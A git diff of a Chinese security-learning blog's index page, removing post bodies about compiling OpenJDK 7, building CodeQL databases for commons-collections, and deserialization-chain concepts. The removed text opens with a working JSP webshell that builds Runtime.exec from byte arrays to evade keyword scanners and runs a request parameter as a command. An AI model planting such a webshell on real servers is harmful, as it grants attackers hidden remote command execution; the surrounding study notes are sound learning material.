class="number">101</span>&#125;;</span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="keyword">new</span> String(a));<span class="comment">//这个forName加载类的时候会执行类内的静态代码块</span></span><br><span class="line">    <span class="keyword">byte</span>[] b=&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;;</span><br><span class="line">    Method method = aClass.getMethod(<span class="keyword">new</span> String(b));</span><br><span class="line">    Object o = method.invoke(<span class="keyword">null</span>);<span class="comment">//这里获取到runtime类</span></span><br><span class="line">    <span class="keyword">byte</span>[] c=&#123;<span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>&#125;;</span><br><span class="line">    Method method1 = aClass.getMethod(<span class="keyword">new</span> String(c), String.class);</span><br><span class="line">    method1.invoke(o,request.getParameter(<span class="string">&quot;haha&quot;</span>));</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
-
-<p>比较基础的东西,别笑话我呜呜呜呜</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/05/16/jsp%E6%97%A0%E5%85%B3%E9%94%AE%E5%AD%97%E4%B8%80%E5%8F%A5%E8%AF%9D/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -382,7 +870,7 @@
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/16/%E7%BC%96%E8%AF%91jdk7%E5%B9%B6%E6%9E%84%E5%BB%BAcodeql%E6%95%B0%E6%8D%AE%E5%BA%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="image" content="/../images/luoqixi.png">
       <meta itemprop="name" content="blueSatchel">
       <meta itemprop="description" content="">
     </span>
@@ -408,6 +896,13 @@
             </span>
 
           
+            <span id="/2022/05/16/%E7%BC%96%E8%AF%91jdk7%E5%B9%B6%E6%9E%84%E5%BB%BAcodeql%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-meta-item leancloud_visitors" data-flag-title="centos编译openjdk7成功---但是创建codeql数据库失败的记录" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -439,60 +934,14 @@
 </blockquote>
 <p>本篇文章可以作为编译openjdk7的参考,但是由于不熟悉编译原理,到底为什么可以编译openjdk7却不能像openjdk8一样生成对应的codeql数据库就不知道为啥了</p>
 <p>安装所需库和工具,依次执行按y即可</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">yum install cups-devel.x86_64</span><br><span class="line">yum install freetype.x86_64 freetype-devel.x86_64</span><br><span class="line">yum install alsa*</span><br><span class="line">yum install ant</span><br><span class="line">yum install cups-devel</span><br><span class="line">yum install glibc-static libstdc++-static</span><br><span class="line">yum install libX*</span><br><span class="line">yum install libXt-devel</span><br><span class="line">yum install libXrender-devel</span><br><span class="line">yum install libXext-devel</span><br><span class="line">yum install libXtst-devel</span><br><span class="line">yum install gcc gcc-c++</span><br><span class="line">yum install freetype-devel</span><br><span class="line">yum install libstdc++-static</span><br></pre></td></tr></table></figure>
-
-<h3 id="安装BootJdk"><a href="#安装BootJdk" class="headerlink" title="安装BootJdk"></a>安装BootJdk</h3><p>去官网下载安装jdk1.6</p>
-<blockquote>
-<p>链接<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html">https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html</a></p>
-</blockquote>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220516125517310.png" alt="image-20220516125517310"></p>
-<p>下载下来通过ssh工具传到usr/local目录下</p>
-<p><code>chmod 775 jdk-6u45-linux-x64.bin </code></p>
-<p>使用改命令修改其为可执行</p>
-<p><code>./jdk-6u45-linux-x64.bin</code></p>
-<p>会自动在当前目录解压出来一个<code>jdk1.6.0_45</code></p>
-<p>接着,修改系统变量</p>
-<p><code>vim /etc/profile</code></p>
-<p>在最下面插入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#set Java enviroment</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib:/usr/<span class="built_in">local</span>/src/apache-ant-1.8.2/lib/ant-launcher.jar</span><br><span class="line"></span><br><span class="line"><span class="comment">#set Ant enviroment</span></span><br><span class="line"></span><br><span class="line">ANT_HOME=/usr/<span class="built_in">local</span>/src/apache-ant-1.8.2</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$ANT_HOME</span>/bin:<span class="variable">$CLASSPATH</span>:<span class="variable">$JRE_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
-
-<p>然后<code>!wq</code>退出</p>
-<p><code>source /etc/profile</code>更新变量</p>
-<p><code>java-version</code></p>
-<p>显示为jdk1,6即配置成功</p>
-<h3 id="下载openjdk"><a href="#下载openjdk" class="headerlink" title="下载openjdk"></a>下载openjdk</h3><p>直接去官网下载很慢,推荐一个技巧,参考链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/wbo112/article/details/121584122">https://blog.csdn.net/wbo112/article/details/121584122</a></p>
-<p>文章中添加的是openjdk的仓库,我们在openjdk的github仓库那里搜索jdk7u按照一样的方式即可生成到码云</p>
-<p>我们需要编译的是jdk7u21,在生成好的jdk7u仓库里面通过标签找到对应版本下载即可</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220516132045787.png" alt="image-20220516132045787"></p>
-<p>通过ssh上传到centos的任意位置</p>
-<p>然后通过<code>unzip</code>进行解压</p>
-<p>解压完成后进入解压出来的目录</p>
-<p>在里面创建bash脚本</p>
-<p><code>touch jdk.sh</code></p>
-<p><code>chmod jdk.sh</code></p>
-<p><code>vim jdk.sh</code></p>
-<p>往里面添加</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> LANG=C</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_BOOTDIR=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_JDK_IMPORT_PATH=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALLOW_DOWNLOADS=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> HOTSPOT_BUILD_JOBS=4</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_PARALLEL_COMPILE_JOBS=4</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_COMPARE_IMAGES=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> USE_PRECOMPILED_HEADER=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_LANGTOOLS=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#export BUILD_JAXP=false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_JAXWS=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#export BUILD_CORBA=false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_HOTSPOT=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_JDK=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> DISABLE_HOTSPOT_OS_VERSION_CHECK=ok</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_DEBUG_BUILD=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_FASTDEBUG_BUILD=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> DEBUG_NAME=debug</span><br><span class="line"></span><br><span class="line">BUILD_DEPLOY=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">BUILD_INSTALL=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_OUTPUTDIR=/usr/<span class="built_in">local</span>/src/openjdk/build</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> JAVA_HOME</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> CLASSPATH</span><br><span class="line"></span><br><span class="line">make sanity</span><br></pre></td></tr></table></figure>
-
-<p>然后<code>!wq</code>退出并保存</p>
-<p>接着<code>source ./jdk.sh</code></p>
-<p>如果输出结果为Sanity check passed表示编译检查通过(但是不代表编译一定不会出错)</p>
-<p>如果检查通过了,不要切换终端,(因为设定的变量在其他终端中无法读取)</p>
-<p>就在当前终端中输入<code>make</code>进行编译</p>
-<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220516124540997.png" alt="image-20220516124540997"></p>
-<p>最终在经过大概15分钟的等待之后,出现这段字符就表示编译成功了,我这里两分钟是因为已经编译过一次了</p>
-<h3 id="生成codeql数据库失败"><a href="#生成codeql数据库失败" class="headerlink" title="生成codeql数据库失败"></a>生成codeql数据库失败</h3><p>我编译jdk7u21的数据库的初衷是想使用codeql编写7u21反序列化漏洞的查询语句试试水</p>
-<p>对编译原理啥的都不咋了解,甚至连jdk为啥要编译都不知道…</p>
-<p>编译数据库的过程是参考的这篇大佬编译jdk8数据库的<a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122330521">文章</a></p>
-<p>按照本篇文章的操作,只要通过make编译jdk的准备都做好,并且make编译还成功了的话,使用这段语句便可成功编译出jdk的codeql数据库</p>
-<p><code>codeql database create openjdk7u21-db --language=&quot;java&quot; --command=&quot;make&quot; --overwrite</code></p>
-<p>但是不知道为什么在jdk7上面行不通,如果后面编译成功了的话,再来更新这篇文章</p>
-<blockquote>
-<p>参考文章</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37726449/article/details/81226606">https://blog.csdn.net/m0_37726449/article/details/81226606</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122330521">https://blog.csdn.net/mole_exp/article/details/122330521</a></p>
-</blockquote>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/05/16/%E7%BC%96%E8%AF%91jdk7%E5%B9%B6%E6%9E%84%E5%BB%BAcodeql%E6%95%B0%E6%8D%AE%E5%BA%93/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -514,7 +963,7 @@
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="image" content="/../images/luoqixi.png">
       <meta itemprop="name" content="blueSatchel">
       <meta itemprop="description" content="">
     </span>
@@ -549,6 +998,13 @@
             </span>
 
           
+            <span id="/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/" class="post-meta-item leancloud_visitors" data-flag-title="codeql编写cc链查询" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -578,7 +1034,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">序列化利用链的条件:</span><br><span class="line">1. source，入口点，一般就是一个readObject方法</span><br><span class="line">2. sink，执行点，一般是动态方法执行、Jndi注入、写文件之类的   在本次的链中就是invokerTransformer的transform方法</span><br><span class="line">3. gadget，连接source和sink的多个类。有几个条件：</span><br><span class="line">	1). 类之间的方法调用是链式的。</span><br><span class="line">	2). 类实例之间的关系是嵌套的，调用链上后一个类实例是前一个类实例的属性。</span><br><span class="line">	3). 调用链上的类都需要是可以序列化的。</span><br></pre></td></tr></table></figure>
 
 <p>由于codeql无法在多个数据库之间查询流,并且cc的source全是jdk自带类的readObject,万恶之源还得是LazyMap和ChainedTransformer,就暂且以他两作为source,执行点呢就更简单了,就是InvokerTransformer和InstantiareTransformer</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/05/14/codeql%E7%BC%96%E5%86%99cc%E9%93%BE%E6%9F%A5%E8%AF%A2/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -600,7 +1063,7 @@
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="image" content="/../images/luoqixi.png">
       <meta itemprop="name" content="blueSatchel">
       <meta itemprop="description" content="">
     </span>
@@ -635,6 +1098,13 @@
             </span>
 
           
+            <span id="/2022/05/12/%E4%BD%BF%E7%94%A8codeql%E7%9A%84cc%E9%93%BE%E5%88%86%E6%9E%90/" class="post-meta-item leancloud_visitors" data-flag-title="使用codeql的cc链分析" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
   
   <span class="post-meta-item">
     
@@ -662,540 +1132,10 @@
           <p>使用codeql来分析cc链</p>
 <p>由于codeql无法多个数据库之间查询流,所以只能采用半条链拼接半条链的方式来进行操作</p>
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/283795.html">参考文章</a></p>
-<h4 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">什么是source和sink</span><br><span class="line"></span><br><span class="line">在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。</span><br><span class="line"></span><br><span class="line">source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</span><br><span class="line"></span><br><span class="line">sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</span><br><span class="line"></span><br><span class="line">sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</span><br></pre></td></tr></table></figure>
-
-<p>分析cc1进行一次尝试</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/06/codeql%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/../images/avatar.PNG">
-      <meta itemprop="name" content="blueSatchel">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="blueSatchel's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/05/06/codeql%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">构建Connons-Colletions3.2_x 的Codeql数据库</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-05-06 13:41:35" itemprop="dateCreated datePublished" datetime="2022-05-06T13:41:35+08:00">2022-05-06</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-05-12 16:21:02" itemprop="dateModified" datetime="2022-05-12T16:21:02+08:00">2022-05-12</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/codeql/" itemprop="url" rel="index"><span itemprop="name">codeql</span></a>
-                </span>
-            </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2022/05/06/codeql%E5%AD%A6%E4%B9%A0/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/06/codeql%E5%AD%A6%E4%B9%A0/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="构建Connons-Colletions3-2-x-的Codeql数据库"><a href="#构建Connons-Colletions3-2-x-的Codeql数据库" class="headerlink" title="构建Connons-Colletions3.2_x 的Codeql数据库"></a>构建Connons-Colletions3.2_x 的Codeql数据库</h1><p>安装配置好codeql也有一段时间了,期间看了一些简单的语法和例子,最近学校期末了,老师安排的屁事有点多,导致好几天没学习了</p>
-<p>之前就听说codeql分析利用链特别厉害,java中反序列化利用链最出名的就是cc链了吧(个人观点),我学习codeql的目标就是自己能仿照着编写cc链的ql语句</p>
-<p>但是codeql现在的java模块有个问题,就是生成数据库的时候,只能生成一个项目的代码数据库,它的依赖只有在代码中引入并加载的类才会被添加到数据库当中去</p>
-<p>对此,我去github提问了一下(这也是我第一次在github提问…)</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/4e3482e87f6c59f7fb66e9d7f4c6645b.png" alt="image-20220512152353868"></p>
-<p>这是维护者大佬做出的回复</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/05cf854bb259eefe20bbb18ed9314c4d.png" alt="image-20220512152328284"></p>
-<p>总而言之,就是想分析哪个依赖,就得单独为它创建数据库,我点了大佬的链接进去,下载下来的数据库是cc4的最新版本的数据库,可能是因为master分支放的是cc4吧…..</p>
-<p>那没办法只能自己建cc3的库了…..</p>
-<p>于是参照这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/mole_exp/article/details/122330521">https://blog.csdn.net/mole_exp/article/details/122330521</a></p>
-<p>这篇文章中提到两种数据库获取方式,第一种就是去lgtm直接下载,第二种是自己clone一份代码下来,然后上传到github仓库并配置lgtm让lgtm扫描后再去下载数据库,但是转念一想,既然它能生成,那我自己用clone的代码来搞不也一样吗</p>
-<p>于是开始了痛苦之路</p>
-<h2 id="建立CC3数据库"><a href="#建立CC3数据库" class="headerlink" title="建立CC3数据库"></a>建立CC3数据库</h2><p>接下来的东西需要对git的基础命令和原理有一定的了解,可以先去b站看<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1FE411P7B3?spm_id_from=333.337.search-card.all.click">狂神的git视频</a>学习一下</p>
-<p>git clone并切换源码到指定分支</p>
-<p>先打开git bash  然后 clone cc项目</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/commons-collections.git</span><br></pre></td></tr></table></figure>
-
-<p>接下来cd进入项目目录,切换分支为cc3</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout COLLECTIONS_3_2_X</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>错误方式</p>
-</blockquote>
-<p>一看里面有pom.xml文件,大喜过望,开始mvn clean install生成数据库,然后一个大大的fatal甩在脸上……</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create D:\TOOLS\codeql\database\commons-collection3.2 --language=<span class="string">&quot;java&quot;</span> --<span class="built_in">command</span>=<span class="string">&quot;mvn clean install --file pom.xml&quot;</span> --source-root=D:\TOOLS\codeql\soutce-project\commons-collections --overwrite </span><br></pre></td></tr></table></figure>
-
-<p>之前的文章中说过,生成数据库出错了不能着急,要一步步排查,首先codeql命令行是不会给出具体的错误提示的,只会说是mvn这条命令报错了</p>
-<p>总的来说有两个错误,我们一一来分析解决</p>
-<h4 id="错误一"><a href="#错误一" class="headerlink" title="错误一"></a>错误一</h4><p>然后我们打开idea,在idea命令行中使用mvn clean install –file pom.xml进行编译,出现了这样返回类型不一致的报错,打开报错的类的源码,发现这几个名字牛逼轰轰的Map类中remove方法返回的是Object类型的,这和其间接继承的Map接口中定义的boolean截然不同,怪不得报错</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/8d6d61815dec7b21aa543fcb46fa45c0.png" alt="image-20220512153751430"></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/bc39db9b1d776707a9b8c386825b546c.png" alt="image-20220512154328441"></p>
-<h6 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h6><p>当我在idea的Project Structure中把jdk版本从平时用的1.8下调到1.7的时候,这个报错就消失了,欧耶!!!</p>
-<h4 id="错误二"><a href="#错误二" class="headerlink" title="错误二"></a>错误二</h4><p>但是与此同时,还有个问题也发生了,使用idea右侧边连的maven 依次 clean和install的时候,报了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">错误: 不再支持目标选项 1.2。请使用 7 或更高版本。</span><br></pre></td></tr></table></figure>
-
-<p>的错误</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/5c58d7e1dc433f315606b54789280a6c.png" alt="image-20220512154036543"></p>
-<p>去百度之后发现大概意思就是说,jdk版本太低了,咋了咋了的</p>
-<p>在cc3的pom.xml最下面发现它自己指定了编译的jdk版本是1.2</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/b7c35e183f5f612933fc48656b934440.png" alt="image-20220512154601318"></p>
-<h6 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h6><p>为了一次性到位,首先把pom.xml中的版本改成1.7</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/fdf861fb56261b5ff30edf2d38ee09a3.png" alt="image-20220512154736745"></p>
-<p>接着在最下面的plugins中添加这两个</p>
-<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220512154819016.png" alt="image-20220512154819016" style="zoom:80%;" />
-
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-surefire-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.22.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">testFailureIgnore</span>&gt;</span>true<span class="tag">&lt;/<span class="name">testFailureIgnore</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>并且,打开本地maven的setting.xml文件</p>
-<p>找到对应的位置,就是<code>&lt;profiles&gt;</code>标签下面就行,添加如下语句,指定默认jdk版本</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">profile</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.7<span class="tag">&lt;/<span class="name">id</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">activation</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">activation</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.7<span class="tag">&lt;/<span 